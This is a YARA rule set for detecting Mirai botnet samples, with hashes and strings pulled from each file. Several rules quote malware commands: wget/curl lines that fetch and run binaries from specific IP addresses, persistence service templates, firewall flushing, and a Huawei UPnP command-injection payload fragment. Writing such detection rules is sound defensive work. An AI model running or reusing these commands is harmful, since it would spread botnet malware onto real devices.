/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-10
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

rule Mirai_signature__c6ffa5e5 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c6ffa5e5.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c6ffa5e5233eec8602396c555bf5e591a8a209f004efe744fecc97c231da5377"
   strings:
      $s1 = "N^NuPOST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__cb7e0308 {
   meta:
      description = "_subset_batch - file Mirai(signature)_cb7e0308.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cb7e030890020c8d042b534ca614437a484d296dc1c36e7f354e0c3574fd92e0"
   strings:
      $s1 = " POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__cdf03a3e {
   meta:
      description = "_subset_batch - file Mirai(signature)_cdf03a3e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cdf03a3e6099b811193de8bfc0b098aa352235ebd2dbada2f6a977fb498d3f44"
   strings:
      $s1 = "N^NuPOST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__9efa779b {
   meta:
      description = "_subset_batch - file Mirai(signature)_9efa779b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9efa779b71cc391be25e2bb02f538839501750164fce29c2dc183c4b9d60f520"
   strings:
      $s1 = "Header check failed" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__c91dd8e8 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c91dd8e8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c91dd8e8aae20a1739d3722b363094f7c3b0e3d2ed1dae8bad202348d95c2660"
   strings:
      $s1 = "Header check failed" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__ab600603 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ab600603.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ab6006033ba1a1cb942c18c8d274eab7536add2e4848e37a6b52c8d0fbaad80f"
   strings:
      $s1 = "attack_tcp_rbypass" fullword ascii /* score: '15.00'*/
      $s2 = "attack_udp_bypass" fullword ascii /* score: '15.00'*/
      $s3 = "Header check failed" fullword ascii /* score: '12.00'*/
      $s4 = "util_fdgets" fullword ascii /* score: '9.00'*/
      $s5 = "udp_discord_flood" fullword ascii /* score: '9.00'*/
      $s6 = "selfrealpath" fullword ascii /* score: '8.00'*/
      $s7 = "alphaset" fullword ascii /* score: '8.00'*/
      $s8 = "balphaset" fullword ascii /* score: '8.00'*/
      $s9 = "halphaset" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__af0fb9d1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_af0fb9d1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "af0fb9d161fed8081df37d21e77efdab7faa16c1907e8b85a0bad038a156c643"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for sh" fullword ascii /* score: '17.50'*/
      $s2 = "Header check failed" fullword ascii /* score: '12.00'*/
      $s3 = "Can't modify %s's text section. Use GCC option -fPIC for shared objects, please." fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__c40d742d {
   meta:
      description = "_subset_batch - file Mirai(signature)_c40d742d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c40d742d0624818fdf7a28e64abd7ba14ce8f169250df2a16c63ada649f8f5f7"
   strings:
      $s1 = "attack_tcp_rbypass" fullword ascii /* score: '15.00'*/
      $s2 = "attack_udp_bypass" fullword ascii /* score: '15.00'*/
      $s3 = "Header check failed" fullword ascii /* score: '12.00'*/
      $s4 = "util_fdgets" fullword ascii /* score: '9.00'*/
      $s5 = "udp_discord_flood" fullword ascii /* score: '9.00'*/
      $s6 = "selfrealpath" fullword ascii /* score: '8.00'*/
      $s7 = "alphaset" fullword ascii /* score: '8.00'*/
      $s8 = "balphaset" fullword ascii /* score: '8.00'*/
      $s9 = "halphaset" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__c8b332f8 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c8b332f8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c8b332f86e4ab5c44e73c8939842880d1d9792744cccdcf508564a0670879b28"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for 386" fullword ascii /* score: '17.50'*/
      $s2 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
      $s3 = "Header check failed" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__dac57073 {
   meta:
      description = "_subset_batch - file Mirai(signature)_dac57073.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dac570738a4254e10531f4333691b45f8fec25da29d4a6b67d8b3aceb097064b"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARM" fullword ascii /* score: '17.50'*/
      $s2 = "R_ARM_PC24: Compile shared libraries with -fPIC!" fullword ascii /* score: '16.00'*/
      $s3 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
      $s4 = "%s: '%s' library contains unsupported TLS" fullword ascii /* score: '12.50'*/
      $s5 = "Header check failed" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__dcc02eae {
   meta:
      description = "_subset_batch - file Mirai(signature)_dcc02eae.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dcc02eae8f8cf6afc5f32c5a12a7d7be6a7c720aa0b4f001ec8c96c247579a1e"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for powerpc" fullword ascii /* score: '17.50'*/
      $s2 = "R_PPC_REL24: Compile shared libraries with -fPIC!" fullword ascii /* score: '16.00'*/
      $s3 = "Header check failed" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__b137e704 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b137e704.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b137e7049facd81bf0e15a0bb6b0135732a43e126b799e903798f05ef87ca98e"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for 386" fullword ascii /* score: '17.50'*/
      $s2 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__ac4a61ed {
   meta:
      description = "_subset_batch - file Mirai(signature)_ac4a61ed.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ac4a61edcb0c971f8f6b4b13f51e4105b4c838a344022091f1dcf351240a80b5"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for sh" fullword ascii /* score: '17.50'*/
      $s2 = "Can't modify %s's text section. Use GCC option -fPIC for shared objects, please." fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__b772d556 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b772d556.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b772d55640399dee9b277a0ffd7ef8f65bb87363dbfdd0634cb88328528f369d"
   strings:
      $s1 = "attack_tcp_rbypass" fullword ascii /* score: '15.00'*/
      $s2 = "attack_udp_bypass" fullword ascii /* score: '15.00'*/
      $s3 = "util_fdgets" fullword ascii /* score: '9.00'*/
      $s4 = "udp_discord_flood" fullword ascii /* score: '9.00'*/
      $s5 = "selfrealpath" fullword ascii /* score: '8.00'*/
      $s6 = "alphaset" fullword ascii /* score: '8.00'*/
      $s7 = "balphaset" fullword ascii /* score: '8.00'*/
      $s8 = "halphaset" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__c39196e5 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c39196e5.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c39196e5ab865850c997492cc40ea9e9533ce1bcf915b255647f4ad82418be25"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for x86_64" fullword ascii /* score: '17.50'*/
      $s2 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__cb615e15 {
   meta:
      description = "_subset_batch - file Mirai(signature)_cb615e15.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cb615e15b7af42bbe74798f6c42825ccd4a1c6faf6695dafe04c8ba70f145155"
   strings:
      $x1 = "ExecStart=/bin/bash -c 'wget -O %s %s && chmod +x %s && %s'" fullword ascii /* score: '41.00'*/
      $x2 = "%s:2345:respawn:/bin/bash -c 'wget -O %s %s && chmod +x %s && %s' >/dev/null 2>&1" fullword ascii /* score: '34.50'*/
      $s3 = "# description: %s service" fullword ascii /* score: '20.00'*/
      $s4 = "wget -O %s %s && chmod +x %s && %s &" fullword ascii /* score: '19.00'*/
      $s5 = "wget -O %s %s >/dev/null 2>&1 && chmod +x %s && %s >/dev/null 2>&1 &" fullword ascii /* score: '19.00'*/
      $s6 = "# %s init script" fullword ascii /* score: '17.00'*/
      $s7 = "Description=%s Service" fullword ascii /* score: '16.00'*/
      $s8 = "After=network.target" fullword ascii /* score: '14.00'*/
      $s9 = "chkconfig --add %s >/dev/null 2>&1" fullword ascii /* score: '14.00'*/
      $s10 = "systemctl enable %s.service >/dev/null 2>&1" fullword ascii /* score: '13.00'*/
      $s11 = "systemctl start %s.service >/dev/null 2>&1" fullword ascii /* score: '13.00'*/
      $s12 = "# chkconfig: 35 99 99" fullword ascii /* score: '11.00'*/
      $s13 = "# %s startup" fullword ascii /* score: '11.00'*/
      $s14 = "%s%s.service" fullword ascii /* score: '11.00'*/
      $s15 = "    wget -O %s %s >/dev/null 2>&1" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__9fd09078 {
   meta:
      description = "_subset_batch - file Mirai(signature)_9fd09078.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9fd09078a4b1396a28adba821f6ff49847f78af75e0ddecbfbab21b2d3f19020"
   strings:
      $s1 = "[main] failed to create process group, continuing anyway" fullword ascii /* score: '18.00'*/
      $s2 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
      $s3 = "[main] failed to hide cmdline name, continuing anyway" fullword ascii /* score: '15.00'*/
      $s4 = "[main] created new process group" fullword ascii /* score: '15.00'*/
      $s5 = "[main/conn]: lost connection with C&C (errno: %d, stat: 2)" fullword ascii /* score: '12.50'*/
      $s6 = "[main/conn]: lost connection with C&C (errno: %d, stat: 1)" fullword ascii /* score: '12.50'*/
      $s7 = "[main/conn]: attempting to connect to cnc" fullword ascii /* score: '11.00'*/
      $s8 = "[main] Failed to resolve CNC address" fullword ascii /* score: '10.00'*/
      $s9 = "[main/ensure] error creating socket for esi port" fullword ascii /* score: '10.00'*/
      $s10 = "Resolved %s to %d IPv4 addresses" fullword ascii /* score: '10.00'*/
      $s11 = "[main/conn]: error while connecting to C&C (errno: %d)" fullword ascii /* score: '10.00'*/
      $s12 = "[resolv] Found IP address: %d.%d.%d.%d" fullword ascii /* score: '10.00'*/
      $s13 = "Couldn't connect to host for ACK Stomp in time. Retrying" fullword ascii /* score: '9.00'*/
      $s14 = "[resolv] Couldn't resolve %s in time. %d tr%s" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}
rule Mirai_signature__aa6a0e34 {
   meta:
      description = "_subset_batch - file Mirai(signature)_aa6a0e34.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aa6a0e3459941e3041c87c1c2e71274b1fb6e9b6883d84c99c76a79dec427fc8"
   strings:
      $s1 = "[debug] Target %d: %s/%d" fullword ascii /* score: '23.50'*/
      $s2 = "(condi/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "(condi/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "failed to set rlimit process limit" fullword ascii /* score: '20.00'*/
      $s5 = "[attack] Started attack process with pid %d in slot %d" fullword ascii /* score: '18.00'*/
      $s6 = "POST /api/data HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s7 = "GET /index.html HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s8 = "[attack] No free slots for new attack process" fullword ascii /* score: '15.00'*/
      $s9 = "(condi/main): detected newer instance running! killing process" fullword ascii /* score: '15.00'*/
      $s10 = "[attack] Found dead process pid: %d" fullword ascii /* score: '15.00'*/
      $s11 = "failed to set rlimit file descriptor limit" fullword ascii /* score: '15.00'*/
      $s12 = "[attack/init]: starting attack process in slot %d..." fullword ascii /* score: '13.00'*/
      $s13 = "PUT /upload HTTP/1.1" fullword ascii /* score: '13.00'*/
      $s14 = "[debug] Option %d: key=%d, val=%s" fullword ascii /* score: '12.50'*/
      $s15 = "HEAD / HTTP/1.1" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule Mirai_signature__aecafcb8 {
   meta:
      description = "_subset_batch - file Mirai(signature)_aecafcb8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aecafcb8649fd122e544fecf1f512b766afae84904e837246e63036c417e06dd"
   strings:
      $s1 = "e != EDEADLK || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHREAD_MUTEX_RECURSIVE_NP)" fullword ascii /* score: '24.00'*/
      $s2 = "glibc.pthread.mutex_spin_count" fullword ascii /* score: '21.00'*/
      $s3 = "PTHREAD_MUTEX_TYPE (mutex) == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii /* score: '21.00'*/
      $s4 = "__pthread_mutex_unlock_usercnt" fullword ascii /* score: '21.00'*/
      $s5 = "type == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii /* score: '21.00'*/
      $s6 = "Unexpected error %d on netlink descriptor %d (address family %d)." fullword ascii /* score: '19.00'*/
      $s7 = "?33333333" fullword ascii /* reversed goodware string '33333333?' */ /* score: '19.00'*/ /* hex encoded string '3333' */
      $s8 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s9 = "pthread_mutex_lock.c" fullword ascii /* score: '18.00'*/
      $s10 = "___pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s11 = "pthread_mutex_unlock.c" fullword ascii /* score: '18.00'*/
      $s12 = "__pthread_mutex_lock_full" fullword ascii /* score: '18.00'*/
      $s13 = "vvvvvvvvvvvvvvvvv" fullword wide /* reversed goodware string 'vvvvvvvvvvvvvvvvv' */ /* score: '18.00'*/
      $s14 = "%s: line %d: bad command `%s'" fullword ascii /* score: '17.50'*/
      $s15 = "EHWPOISON" fullword ascii /* score: '16.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

rule Mirai_signature__b5d6e2a3 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b5d6e2a3.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b5d6e2a3056504592a2ba8ba418ac39a4df24d531d3e4ed25836fe417b7ff89c"
   strings:
      $s1 = "attack_tcp_rbypass" fullword ascii /* score: '15.00'*/
      $s2 = "attack_udp_bypass" fullword ascii /* score: '15.00'*/
      $s3 = "util_fdgets" fullword ascii /* score: '9.00'*/
      $s4 = "udp_discord_flood" fullword ascii /* score: '9.00'*/
      $s5 = "selfrealpath" fullword ascii /* score: '8.00'*/
      $s6 = "alphaset" fullword ascii /* score: '8.00'*/
      $s7 = "balphaset" fullword ascii /* score: '8.00'*/
      $s8 = "halphaset" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__a0dd8165 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a0dd8165.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a0dd8165d240507667a4d4ff8b88fba956bfed45cef129710c434471476d0144"
   strings:
      $s1 = "wget http://160.250.134.48/mpsl || busybox wget http://160.250.134.48/mpsl; chmod 777 mpsl; ./mpsl tvt;" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://160.250.134.48/arm5 || busybox wget http://160.250.134.48/arm5; chmod 777 arm5; ./arm5 tvt;" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://160.250.134.48/arm7 || busybox wget http://160.250.134.48/arm7; chmod 777 arm7; ./arm7 tvt;" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://160.250.134.48/mips || busybox wget http://160.250.134.48/mips; chmod 777 mips; ./mips tvt;" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://160.250.134.48/arm4 || busybox wget http://160.250.134.48/arm4; chmod 777 arm4; ./arm4 tvt;" fullword ascii /* score: '20.00'*/
      $s6 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s7 = "if [ -d \"/tmp\" ]; then" fullword ascii /* score: '12.00'*/
      $s8 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s9 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s10 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s11 = "    busybox mkdir /tmp && cd /tmp" fullword ascii /* score: '9.00'*/
      $s12 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
      $s13 = "kill -9 \"$pid_num\"; fi; fi; done" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__a8db0a2b {
   meta:
      description = "_subset_batch - file Mirai(signature)_a8db0a2b.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a8db0a2b795536b9c017d2cee950a7be09e492592c5cd4f1f5a982286bb1018e"
   strings:
      $s1 = "cp /bin/busybox busybox; curl http://160.250.134.48/mpsl    -o MNCXOP; chmod 777 MNCXOP; ./MNCXOP selfrep.curl" fullword ascii /* score: '21.00'*/
      $s2 = "cp /bin/busybox busybox; curl http://160.250.134.48/arm    -o PLXMKJ; chmod 777 PLXMKJ; ./PLXMKJ selfrep.curl" fullword ascii /* score: '21.00'*/
      $s3 = "cp /bin/busybox busybox; curl http://160.250.134.48/arm7    -o YUIOXC; chmod 777 YUIOXC; ./YUIOXC selfrep.curl" fullword ascii /* score: '21.00'*/
      $s4 = "cp /bin/busybox busybox; curl http://160.250.134.48/mips    -o GHJKLB; chmod 777 GHJKLB; ./GHJKLB selfrep.curl" fullword ascii /* score: '21.00'*/
      $s5 = "cp /bin/busybox busybox; curl http://160.250.134.48/arm5    -o WQZRTY; chmod 777 WQZRTY; ./WQZRTY selfrep.curl" fullword ascii /* score: '21.00'*/
      $s6 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s7 = "/bin/busybox mount -o bind,remount,ro \"$dir\"" fullword ascii /* score: '15.00'*/
      $s8 = "# lol fuck you ducky watch me" fullword ascii /* score: '13.00'*/
      $s9 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s10 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s11 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s12 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
      $s13 = "kill -9 \"$pid_num\"; fi; fi; done" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__ac121931 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ac121931.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ac121931177adc785c0bc30e200714dbbe2394bf849f9b79c2d982a8af367000"
   strings:
      $s1 = "rm -rf adferqtg; busybox wget http://42.112.26.45/skid.arm     -O- > adferqtg; chmod 777 adferqtg; ./adferqtg goahead" fullword ascii /* score: '26.00'*/
      $s2 = "rm -rf wrtuikdb; busybox wget http://42.112.26.45/skid.arm7    -O- > wrtuikdb; chmod 777 wrtuikdb; ./wrtuikdb goahead" fullword ascii /* score: '23.00'*/
      $s3 = "rm -rf asdfvacb; busybox wget http://42.112.26.45/skid.arm5    -O- > asdfvacb; chmod 777 asdfvacb; ./asdfvacb goahead" fullword ascii /* score: '23.00'*/
      $s4 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s5 = "if [ -d \"/tmp\" ]; then" fullword ascii /* score: '12.00'*/
      $s6 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s7 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s8 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s9 = "    busybox mkdir /tmp && cd /tmp" fullword ascii /* score: '9.00'*/
      $s10 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
      $s11 = "kill -9 \"$pid_num\"; fi; fi; done" fullword ascii /* score: '8.00'*/
      $s12 = "busybox iptables -F" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__c5bb5cdd {
   meta:
      description = "_subset_batch - file Mirai(signature)_c5bb5cdd.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c5bb5cddef015c65fa6c09c8704722ffb121882df30866b764b796a9e3e51cd0"
   strings:
      $s1 = "cp /bin/busybox busybox; busybox wget http://160.250.134.48/mips    -O- > NVBXUE; chmod 777 NVBXUE; ./NVBXUE selfrep.wget" fullword ascii /* score: '26.00'*/
      $s2 = "cp /bin/busybox busybox; busybox wget http://160.250.134.48/arm    -O- > XKJDSA; chmod 777 XKJDSA; ./XKJDSA selfrep.wget" fullword ascii /* score: '26.00'*/
      $s3 = "cp /bin/busybox busybox; busybox wget http://160.250.134.48/arm5    -O- > PRTQWE; chmod 777 PRTQWE; ./PRTQWE selfrep.wget" fullword ascii /* score: '26.00'*/
      $s4 = "cp /bin/busybox busybox; busybox wget http://160.250.134.48/mpsl    -O- > WLOPKJ; chmod 777 WLOPKJ; ./WLOPKJ selfrep.wget" fullword ascii /* score: '26.00'*/
      $s5 = "cp /bin/busybox busybox; busybox wget http://160.250.134.48/arm7    -O- > AFGHTY; chmod 777 AFGHTY; ./AFGHTY selfrep.wget" fullword ascii /* score: '26.00'*/
      $s6 = "[ -z \"$WATCHDOG_DEVICE\" ] && exit 1" fullword ascii /* score: '15.00'*/
      $s7 = "/bin/busybox mount -o bind,remount,ro \"$dir\"" fullword ascii /* score: '15.00'*/
      $s8 = "# lol fuck you ducky watch me" fullword ascii /* score: '13.00'*/
      $s9 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s10 = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do c" ascii /* score: '11.00'*/
      $s11 = "    [ -c \"$dev\" ] && WATCHDOG_DEVICE=\"$dev\" && break" fullword ascii /* score: '10.00'*/
      $s12 = "for dev in /dev/watchdog /dev/watchdog0; do" fullword ascii /* score: '8.00'*/
      $s13 = "kill -9 \"$pid_num\"; fi; fi; done" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__a114500d {
   meta:
      description = "_subset_batch - file Mirai(signature)_a114500d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a114500d711915795d8d3fd849906846756f86da662842c11d78603fd90f4df1"
   strings:
      $s1 = "N^NuPOST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__ab96534d {
   meta:
      description = "_subset_batch - file Mirai(signature)_ab96534d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ab96534d0e2e727d2775fbafc72d8e10a30b273c6c1f7cb51075cf74499e232f"
   strings:
      $s1 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s2 = "cvkqpav" fullword ascii /* score: '8.00'*/
      $s3 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s4 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s5 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s6 = "vaehpao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__c9e96f05 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c9e96f05.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c9e96f0531cafffc45ee937ec087855b52116a00fa66d732d22bf74f82510c91"
   strings:
      $x1 = "XN^Nu<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas." ascii /* score: '40.00'*/
      $s2 = " wget -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDo" ascii /* score: '28.00'*/
      $s3 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d" fullword ascii /* score: '25.50'*/
      $s4 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s5 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s6 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s7 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s8 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s9 = "ap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busy" ascii /* score: '13.00'*/
      $s10 = "XN^Nu<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas." ascii /* score: '10.00'*/
      $s11 = "wnloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s12 = "ps -e -o pid,args=" fullword ascii /* score: '9.00'*/
      $s13 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__dad7b74c {
   meta:
      description = "_subset_batch - file Mirai(signature)_dad7b74c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dad7b74ca29294e3b1f7a4569295de391479b0cff2241fd27fc12694e1c74d5f"
   strings:
      $s1 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s2 = "cvkqpav" fullword ascii /* score: '8.00'*/
      $s3 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s4 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s5 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s6 = "vaehpao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__ab076ec4 {
   meta:
